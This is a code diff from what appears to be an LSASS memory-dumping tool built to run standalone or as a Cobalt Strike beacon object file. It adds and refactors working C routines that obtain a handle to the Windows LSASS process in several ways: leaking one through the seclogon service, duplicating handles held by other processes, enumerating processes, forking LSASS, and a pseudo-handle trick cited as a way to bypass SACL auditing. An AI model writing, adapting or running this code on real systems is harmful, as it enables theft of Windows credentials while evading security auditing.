@@ -3,35 +3,72 @@
 #include "../include/modules.h"
 #include "../include/malseclogon.h"
 
+/*
+ * "The DuplicateHandle system call has an interesting behaviour
+ * when using the pseudo current process handle, which has the value -1.
+ * Specifically if you try and duplicate the pseudo handle from another
+ * process you get back a full access handle to the source process."
+ * https://www.tiraniddo.dev/2017/10/bypassing-sacl-auditing-on-lsass.html
+ */
+HANDLE make_handle_full_access(
+    HANDLE hProcess
+)
+{
+    if (!hProcess)
+        return NULL;
+
+    HANDLE hDuped = NULL;
+    NTSTATUS status = NtDuplicateObject(
+        hProcess,
+        (HANDLE)-1,
+        NtCurrentProcess(),
+        &hDuped,
+        0,
+        0,
+        DUPLICATE_SAME_ACCESS
+    );
+    NtClose(hProcess); hProcess = NULL;
+    if (!NT_SUCCESS(status))
+    {
+        syscall_failed("NtDuplicateObject", status);
+        return NULL;
+    }
+    return hDuped;
+}
+
+// get a handle to LSASS via multiple methods
 HANDLE obtain_lsass_handle(
     DWORD pid,
     DWORD permissions,
     BOOL dup,
     BOOL fork,
+    BOOL use_seclogon,
     BOOL is_seclogon_stage_2,
-    LPCSTR dump_name
+    LPCSTR dump_name,
+    PDWORD duplicated_pid
 )
 {
     HANDLE hProcess = NULL;
+    // use MalSecLogon to leak a handle to LSASS
     if (is_seclogon_stage_2)
     {
         // this is always done from an EXE
 #ifndef BOF
         hProcess = seclogon_stage_2(
-            dump_name,
-            fork
+            dump_name
         );
-        // give LSASS a moment to process the new (fake) credentials
-        sleep(5);
 #endif
     }
+    // duplicate an existing handle to LSASS
     else if (dup)
     {
         hProcess = duplicate_lsass_handle(
             pid,
-            permissions
+            permissions,
+            duplicated_pid
         );
     }
+    // good old NtOpenProcess
     else if (pid)
     {
         hProcess = get_process_handle(
@@ -40,9 +77,11 @@ HANDLE obtain_lsass_handle(
             FALSE
         );
     }
+    // use NtGetNextProcess until a handle to LSASS is obtained
     else
     {
-        // this shouldn't happen
+        // the variable pid should always be set
+        // this branch won't be called
         hProcess = find_lsass(
             permissions
         );
@@ -50,6 +89,7 @@ HANDLE obtain_lsass_handle(
     return hProcess;
 }
 
+// use NtGetNextProcess to get a handle to LSASS
 HANDLE find_lsass(DWORD dwFlags)
 {
     // loop over each process
@@ -76,16 +116,7 @@ HANDLE find_lsass(DWORD dwFlags)
         }
         if (!NT_SUCCESS(status))
         {
-#ifdef DEBUG
-#ifdef BOF
-            BeaconPrintf(CALLBACK_ERROR,
-#else
-            printf(
-#endif
-                "Failed to call NtGetNextProcess, status: 0x%lx\n",
-                status
-            );
-#endif
+            syscall_failed("NtGetNextProcess", status);
             return NULL;
         }
         if (is_lsass(hProcess))
@@ -93,6 +124,7 @@ HANDLE find_lsass(DWORD dwFlags)
     }
 }
 
+// use NtOpenProcess to get a handle to a process
 HANDLE get_process_handle(
     DWORD dwPid,
     DWORD dwFlags,
@@ -154,25 +186,14 @@ HANDLE get_process_handle(
     }
     else if (!NT_SUCCESS(status))
     {
-#ifdef DEBUG
-        if (!quiet)
-        {
-#ifdef BOF
-            BeaconPrintf(CALLBACK_ERROR,
-#else
-            printf(
-#endif
-                "Failed to call NtOpenProcess, status: 0x%lx\n",
-                status
-            );
-        }
-#endif
+        syscall_failed("NtOpenProcess", status);
         return NULL;
     }
 
     return hProcess;
 }
 
+// get all handles in the system
 PSYSTEM_HANDLE_INFORMATION get_all_handles(void)
 {
     NTSTATUS status;
@@ -180,17 +201,7 @@ PSYSTEM_HANDLE_INFORMATION get_all_handles(void)
     PVOID handleTableInformation = intAlloc(buffer_size);
     if (!handleTableInformation)
     {
-#ifdef DEBUG
-#ifdef BOF
-        BeaconPrintf(CALLBACK_ERROR,
-#else
-        printf(
-#endif
-            "Failed to call HeapAlloc for 0x%lx bytes, error: %ld\n",
-            buffer_size,
-            GetLastError()
-        );
-#endif
+        malloc_failed();
         return NULL;
     }
     while (TRUE)
@@ -209,33 +220,14 @@ PSYSTEM_HANDLE_INFORMATION get_all_handles(void)
             handleTableInformation = intAlloc(buffer_size);
             if (!handleTableInformation)
             {
-#ifdef DEBUG
-#ifdef BOF
-                BeaconPrintf(CALLBACK_ERROR,
-#else
-                printf(
-#endif
-                    "Failed to call HeapAlloc for 0x%lx bytes, error: %ld\n",
-                    buffer_size,
-                    GetLastError()
-                );
-#endif
+                malloc_failed();
                 return NULL;
             }
             continue;
         }
         if (!NT_SUCCESS(status))
         {
-#ifdef DEBUG
-#ifdef BOF
-            BeaconPrintf(CALLBACK_ERROR,
-#else
-            printf(
-#endif
-                "Failed to call NtQuerySystemInformation, status: 0x%lx\n",
-                status
-            );
-#endif
+            syscall_failed("NtQuerySystemInformation", status);
             intFree(handleTableInformation); handleTableInformation = NULL;
             return NULL;
         }
@@ -243,6 +235,7 @@ PSYSTEM_HANDLE_INFORMATION get_all_handles(void)
     }
 }
 
+// check if a PID is included in the process list
 BOOL process_is_included(
     PPROCESS_LIST process_list,
     ULONG ProcessId
@@ -256,6 +249,7 @@ BOOL process_is_included(
     return FALSE;
 }
 
+// obtain a list of PIDs from a handle table
 PPROCESS_LIST get_processes_from_handle_table(
     PSYSTEM_HANDLE_INFORMATION handleTableInformation
 )
@@ -263,17 +257,7 @@ PPROCESS_LIST get_processes_from_handle_table(
     PPROCESS_LIST process_list = intAlloc(sizeof(PROCESS_LIST));
     if (!process_list)
     {
-#ifdef DEBUG
-#ifdef BOF
-        BeaconPrintf(CALLBACK_ERROR,
-#else
-        printf(
-#endif
-            "Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
-            (ULONG32)sizeof(PROCESS_LIST),
-            GetLastError()
-        );
-#endif
+        malloc_failed();
         return NULL;
     }
 
@@ -302,6 +286,7 @@ PPROCESS_LIST get_processes_from_handle_table(
     return process_list;
 }
 
+// call NtQueryObject with ObjectTypesInformation
 POBJECT_TYPES_INFORMATION QueryObjectTypesInfo(void)
 {
     NTSTATUS status;
@@ -312,17 +297,7 @@ POBJECT_TYPES_INFORMATION QueryObjectTypesInfo(void)
         obj_type_information = intAlloc(BufferLength);
         if (!obj_type_information)
         {
-#ifdef DEBUG
-#ifdef BOF
-            BeaconPrintf(CALLBACK_ERROR,
-#else
-            printf(
-#endif
-                "Failed to call HeapAlloc for 0x%lx bytes, error: %ld\n",
-                BufferLength,
-                GetLastError()
-            );
-#endif
+            malloc_failed();
             return NULL;
         }
 
@@ -340,19 +315,11 @@ POBJECT_TYPES_INFORMATION QueryObjectTypesInfo(void)
         intFree(obj_type_information); obj_type_information = NULL;
     } while (status == STATUS_INFO_LENGTH_MISMATCH);
 
-#ifdef DEBUG
-#ifdef BOF
-    BeaconPrintf(CALLBACK_ERROR,
-#else
-    printf(
-#endif
-        "Failed to call NtQueryObject, status: 0x%lx\n",
-        status
-    );
-#endif
+    syscall_failed("NtQueryObject", status);
     return NULL;
 }
 
+// get index of object type 'Process'
 BOOL GetTypeIndexByName(PULONG ProcesTypeIndex)
 {
     POBJECT_TYPES_INFORMATION ObjectTypes;
@@ -384,14 +351,17 @@ BOOL GetTypeIndexByName(PULONG ProcesTypeIndex)
     return FALSE;
 }
 
+// find and duplicate a handle to LSASS
 HANDLE duplicate_lsass_handle(
     DWORD lsass_pid,
-    DWORD permissions
+    DWORD permissions,
+    PDWORD duplicated_pid
 )
 {
     NTSTATUS status;
     BOOL success;
 
+    *duplicated_pid = 0;
     ULONG ProcesTypeIndex = 0;
     success = GetTypeIndexByName(&ProcesTypeIndex);
     if (!success)
@@ -473,6 +443,7 @@ HANDLE duplicate_lsass_handle(
             if (is_lsass(hDuped))
             {
                 // found LSASS handle
+                *duplicated_pid = handleInfo->UniqueProcessId;
 #ifdef BOF
                 BeaconPrintf(CALLBACK_OUTPUT,
 #else
@@ -508,6 +479,7 @@ HANDLE duplicate_lsass_handle(
     return NULL;
 }
 
+// create a clone (fork) of the LSASS process
 HANDLE fork_lsass_process(
     DWORD dwPid,
     HANDLE hProcess
@@ -553,16 +525,7 @@ HANDLE fork_lsass_process(
     );
     if (!NT_SUCCESS(status))
     {
-#ifdef DEBUG
-#ifdef BOF
-        BeaconPrintf(CALLBACK_ERROR,
-#else
-        printf(
-#endif
-            "Failed to call NtCreateProcess, status: 0x%lx\n",
-            status
-        );
-#endif
+        syscall_failed("NtCreateProcess", status);
         // process forking failed
         hCloneProcess = NULL;
     }
